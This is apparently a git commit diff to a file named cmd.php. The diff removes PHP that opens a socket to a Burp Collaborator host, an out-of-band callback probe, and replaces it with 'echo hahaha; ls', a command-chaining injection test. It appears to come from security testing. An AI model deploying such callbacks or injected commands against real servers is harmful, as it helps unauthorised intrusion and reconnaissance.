756b26663ecec022d609e3518294434a7ab9ba0e
monkeynika <45063650+monkeynika@users.noreply.github.com>
2019-03-23 00:17:52 +0300

    Update cmd.php

--- cmd.php
+++ cmd.php
@@ -1,15 +1,1 @@
-<?php
-$fp = fsockopen("1hjyfv8evtejru5apa5hv7u5uw0mob.burpcollaborator.net", 80, $errno, $errstr, 30);
-if (!$fp) {
-    echo "$errstr ($errno)<br />\n";
-} else {
-    $out = "GET / HTTP/1.1\r\n";
-    $out .= "Host: www.example.com\r\n";
-    $out .= "Connection: Close\r\n\r\n";
-    fwrite($fp, $out);
-    while (!feof($fp)) {
-        echo fgets($fp, 128);
-    }
-    fclose($fp);
-}
-?>
+echo hahaha; ls
